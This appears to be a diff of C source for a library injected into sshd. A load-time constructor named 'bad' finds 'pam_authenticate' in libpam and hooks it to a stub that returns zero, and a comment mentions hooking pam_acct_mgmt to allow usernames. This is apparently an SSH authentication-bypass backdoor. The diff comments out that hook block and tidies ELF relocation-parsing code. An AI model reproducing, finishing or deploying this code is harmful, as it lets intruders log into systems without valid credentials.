@@ -174,7 +174,6 @@ static int is_sshd(struct link_map *link_map)
 	return 0;
 }
 
-void pamdynamicstuff(void);
 
 static void  __attribute__ ((constructor)) bad(void)
 {
@@ -193,30 +192,21 @@ static void  __attribute__ ((constructor)) bad(void)
 	signal(SIGSEGV, handlesigsegv);
 
 	print_libs(link_map);
-
+/*
 	void *libpam = get_libstart(link_map, "libpam.so.0");
 	void *pam_auth = find_func_ptr(link_map, libpam, "pam_authenticate");
 	
-	//hook(libpam, pam_auth, retzero, 20);
-	/* hook pam_acct_mgmt to allow usernames*/
+	hook(libpam, pam_auth, retzero, 20);
+	//hook pam_acct_mgmt to allow usernames*/
 	
 	pamdynamicstuff();
 	
 	return;
 }
 
-
-static int callback(struct dl_phdr_info *info, size_t size, void *data);
-int (*dl_iterate_phdrptr)(int (*callback) (struct dl_phdr_info *info, size_t size, void *data), void *data);
-
-Elf64_Dyn *pamdyn;
-
 Elf64_Dyn *null1;
 Elf64_Dyn *null2;
 
-Elf64_Ehdr *ehdr;
-
-/* TODO: fix compiler warnings good god */
 void pamdynamicstuff(void)
 {
 	void *o = dlopen("libdl-2.13.so", RTLD_NOW);
@@ -237,22 +227,20 @@ void pamdynamicstuff(void)
  * TODO: there is probably a way to get the correct number of elements in a .dynamic array
  *	so we don't blow something up
  */
-void parse_dyn_array(Elf64_Dyn **dynptrdbl, int elements, Elf64_Rela **RELA,
+void parse_dyn_array(Elf64_Dyn *dynptr, int elements, Elf64_Rela **RELA,
 					 uint64_t **RELASZ, Elf64_Rela **JMPREL, uint64_t **PLTRELSZ)
 {
 	int i;
 
-	Elf64_Dyn *dynptr = *dynptrdbl;
-	
 	for (i = 0; i < elements; i++) {
 		if (dynptr[i].d_tag == DT_RELA)
-			*RELA = (Elf64_Addr *) &dynptr[i].d_un;
+			*RELA = (Elf64_Rela *) &dynptr[i].d_un;
 		else if (dynptr[i].d_tag == DT_JMPREL)
-			*JMPREL = (Elf64_Addr *) &dynptr[i].d_un;
+			*JMPREL = (Elf64_Rela *) &dynptr[i].d_un;
 		else if (dynptr[i].d_tag == DT_PLTRELSZ)
-			*PLTRELSZ = &dynptr[i].d_un;
+			*PLTRELSZ = (uint64_t *) &dynptr[i].d_un;
 		else if (dynptr[i].d_tag == DT_RELASZ)
-			*RELASZ = &dynptr[i].d_un;
+			*RELASZ = (uint64_t *) &dynptr[i].d_un;
 	}
 	return;
 }
@@ -269,10 +257,10 @@ Elf64_Rela *parse_rela(Elf64_Rela *RELA, uint64_t *RELASZ, void *funcneedle)
 
 	int i;
 	for (i = 0; i < relaments; i++) {
-			if ((void *) RELA[0].r_addend == funcneedle)
-				return RELA;
+		if ((void *) RELA[0].r_addend == funcneedle)
+			return RELA;
 
-		RELA = (char *) RELA + (unsigned long long) (sizeof(Elf64_Rela));		
+		RELA = (Elf64_Rela *) ((char *) RELA + (unsigned long long) (sizeof(Elf64_Rela)));
 	}
 	return NULL;
 }
@@ -289,12 +277,14 @@ Elf64_Rela *parse_jmprel(Elf64_Rela *JMPREL, uint64_t *PLTRELSZ, void *funcneedl
 	
 	int i;	
 	for (i = 0; i < jmpelements; i++) {
+
 /*		fprintf(fp, "r_offset = %16p  r_info[type = %10p  sym = %10llu]  r_addend = %10p \n",
 				JMPREL[0].r_offset,
 				ELF64_R_TYPE(JMPREL[0].r_info), ELF64_R_SYM(JMPREL[0].r_info), JMPREL[0].r_addend);
 */		
-		JMPREL = (char*) JMPREL + (unsigned long long) (sizeof(Elf64_Rela));		
+		JMPREL = (Elf64_Rela *) ((char*) JMPREL + (unsigned long long) (sizeof(Elf64_Rela)));
 	}
+	return NULL;
 }
 
 
